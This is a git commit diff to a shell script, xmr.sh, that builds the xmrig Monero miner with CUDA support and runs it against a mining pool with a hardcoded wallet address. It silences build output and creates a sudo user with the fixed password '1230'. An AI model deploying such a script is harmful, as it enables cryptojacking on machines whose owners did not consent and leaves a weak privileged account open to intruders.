1c5a61fa3681a76afef5f8385751c08ac8697edb
Phan Hoàng Long <hoanglong@hi.edu.vn>
2021-01-03 06:05:45 +0700

    Update xmr.sh

--- xmr.sh
+++ xmr.sh
@@ -6,12 +6,19 @@ sudo adduser long sudo
 echo 'long:1230' | sudo chpasswd
 sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd
 sudo apt-get update
+git clone https://github.com/xmrig/xmrig-cuda.git
+mkdir xmrig-cuda/build && cd xmrig-cuda/build
+cmake .. -DCUDA_LIB=/usr/local/cuda/lib64/stubs/libcuda.so -DCUDA_TOOLKIT_ROOT_DIR=/usr/local/cuda
+make -j$(nproc)
+cd
 sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 git clone https://github.com/xmrig/xmrig.git
 mkdir xmrig/build && cd xmrig/build
 cmake ..
 make -j$(nproc)
+cp /home/long/xmrig-cuda/build/libxmrig-cuda.so /home/long/xmrig/build
 } &> /dev/null &&
 printf "\nXong " >&2 ||
 printf "\nLoi " >&2
-./xmrig -o sg.minexmr.com:443 -u 84JEttNYVJiKMqVpnhnp7MhoxWECiZcbg1efDiNSeG2kW3rYj6VfxCFPKVEzLXSgPG2q3LYte4mWZ8QVFh63KE8kL5iXCuN
+#./xmrig -o sg.minexmr.com:443 -u 84JEttNYVJiKMqVpnhnp7MhoxWECiZcbg1efDiNSeG2kW3rYj6VfxCFPKVEzLXSgPG2q3LYte4mWZ8QVFh63KE8kL5iXCuN
+./xmrig --no-cpu --cuda -o sg.minexmr.com:443 -u 84JEttNYVJiKMqVpnhnp7MhoxWECiZcbg1efDiNSeG2kW3rYj6VfxCFPKVEzLXSgPG2q3LYte4mWZ8QVFh63KE8kL5iXCuN -k --tls
